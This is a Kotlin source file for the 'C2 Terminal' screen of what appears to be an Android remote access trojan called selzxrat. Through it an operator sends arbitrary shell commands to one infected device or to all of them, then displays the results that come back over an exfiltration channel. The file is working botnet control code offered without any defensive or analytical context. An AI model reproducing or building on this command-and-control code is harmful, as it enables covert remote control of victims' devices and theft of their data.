package com.selzxrat.v5.ui

import android.os.Bundle
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import com.selzxrat.v5.R
import com.selzxrat.v5.C2Manager

class TerminalActivity : AppCompatActivity() {

    private lateinit var tvTerminal: TextView
    private lateinit var etCommand: EditText
    private lateinit var btnSend: Button
    private lateinit var spBotSelector: Spinner
    private val output = StringBuilder()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_terminal)

        supportActionBar?.title = "C2 Terminal"
        supportActionBar?.setDisplayHomeAsUpEnabled(true)

        tvTerminal = findViewById(R.id.tvTerminalOutput)
        etCommand = findViewById(R.id.etCommand)
        btnSend = findViewById(R.id.btnSendCommand)
        spBotSelector = findViewById(R.id.spBotSelector)

        val adapter = ArrayAdapter(this, android.R.layout.simple_spinner_item, mutableListOf("All Bots"))
        adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item)
        spBotSelector.adapter = adapter

        C2Manager.onBotUpdate { id, _ ->
            runOnUiThread {
                if (adapter.getPosition(id) < 0) {
                    adapter.add(id)
                }
            }
        }

        btnSend.setOnClickListener {
            val cmd = etCommand.text.toString().trim()
            if (cmd.isEmpty()) return@setOnClickListener
            val selected = spBotSelector.selectedItem.toString()
            val target = if (selected == "All Bots" || selected == "") "all" else selected

            C2Manager.sendCommand(target, "shell_exec", cmd)
            output.append("[$target] > $cmd\n")
            tvTerminal.text = output.toString()
            etCommand.text.clear()
        }

        C2Manager.onExfilReceived { data ->
            runOnUiThread {
                if (data.type == "shell_result") {
                    output.append("[${data.deviceId}] $data.content\n")
                    tvTerminal.text = output.toString()
                }
            }
        }
    }

    override fun onSupportNavigateUp(): Boolean {
        finish()
        return true
    }
}